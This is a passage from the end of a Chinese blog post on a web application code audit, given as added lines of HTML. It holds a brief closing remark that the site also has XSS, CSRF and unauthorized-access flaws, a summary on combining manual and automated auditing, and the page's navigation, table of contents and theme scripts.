+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b95ba40d6aa.png"  alt="image-20240131042714881"></p>
+<h3 id="05、其他"><a href="#05、其他" class="headerlink" title="05、其他"></a>05、其他</h3><p>这个站还有一些别的漏洞，如：储存性xss、csrf、越权读取、越权删除等漏洞。网上都可以搜到相关文章、这里就不过多阐述！</p>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>自动化工具在审计的过程中也只是起到辅助作用。在进行代码审计时，手工审计和自动化工具的结合使用通常是更有效的方法。</p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/blog/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/blog/2024/02/27/240227%E5%BE%AE%E4%BF%A1%E8%AF%AD%E9%9F%B3%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"
+                                   title="被隔壁房间女人叫声吵醒后引起的wx权限绕过"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">被隔壁房间女人叫声吵醒后引起的wx权限绕过</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/blog/2024/02/20/240220%E7%B1%BB%E5%8A%A0%E8%BD%BD/"
+                                   title="类加载"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">类加载</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%A3%B0%E6%98%8E"><span class="nav-text">0x02 声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">0x03 环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F"><span class="nav-text">审计系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%BA%90%E7%A0%81%E6%89%AB%E6%8F%8F"><span class="nav-text">0x04 源码扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">0x05 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#01%E3%80%81%E7%A1%AC%E7%BC%96%E7%A0%81%E3%80%81%E8%B6%8A%E6%9D%83%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%BE%97%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="nav-text">01、硬编码、越权组合漏洞获得超级管理员权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#02%E3%80%81sql%E6%B3%A8%E5%85%A5"><span class="nav-text">02、sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#03%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-text">03、任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#04%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">04、文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#05%E3%80%81%E5%85%B6%E4%BB%96"><span class="nav-text">05、其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="nav-text">0x06 总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box shields">
+        
+            <div class="info-item">
+                
+                <a class="shields-item">
+                    <img src="https://img.shields.io/badge/Since-2023_--_2024-dodgerblue?style=flat-square">
+                </a>
+                
+                    <a class="shields-item" href="/blog/">
+                        <img src="https://img.shields.io/badge/WebMaster-Yu9-dodgerblue?style=flat-square">
+                    </a>
+                
+                
+                <a class="shields-item" href="https://hexo.io" target="_blank">
+                    <img src="https://img.shields.io/badge/Powered_by-Hexo-dodgerblue?style=flat-square">
+                </a>
+                <a class="shields-item" href="https://github.com/XPoet/hexo-theme-keep" target="_blank">
+                    <img class="shields-keep-version" src="https://img.shields.io/badge/Theme-Keep-dodgerblue?style=flat-square">
+                </a>
+                
+            </div>
+            
+                <div class="info-item">
+                    
+                        
+                    
+                </div>
+            
+        
+
+        <div class="count-item info-item shields">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">40.7k</span>
+                </span>
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%A3%B0%E6%98%8E"><span class="nav-text">0x02 声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">0x03 环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F"><span class="nav-text">审计系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%BA%90%E7%A0%81%E6%89%AB%E6%8F%8F"><span class="nav-text">0x04 源码扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">0x05 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#01%E3%80%81%E7%A1%AC%E7%BC%96%E7%A0%81%E3%80%81%E8%B6%8A%E6%9D%83%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%BE%97%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="nav-text">01、硬编码、越权组合漏洞获得超级管理员权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#02%E3%80%81sql%E6%B3%A8%E5%85%A5"><span class="nav-text">02、sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#03%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-text">03、任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#04%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">04、文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#05%E3%80%81%E5%85%B6%E4%BB%96"><span class="nav-text">05、其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="nav-text">0x06 总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+
+</body>
+</html>
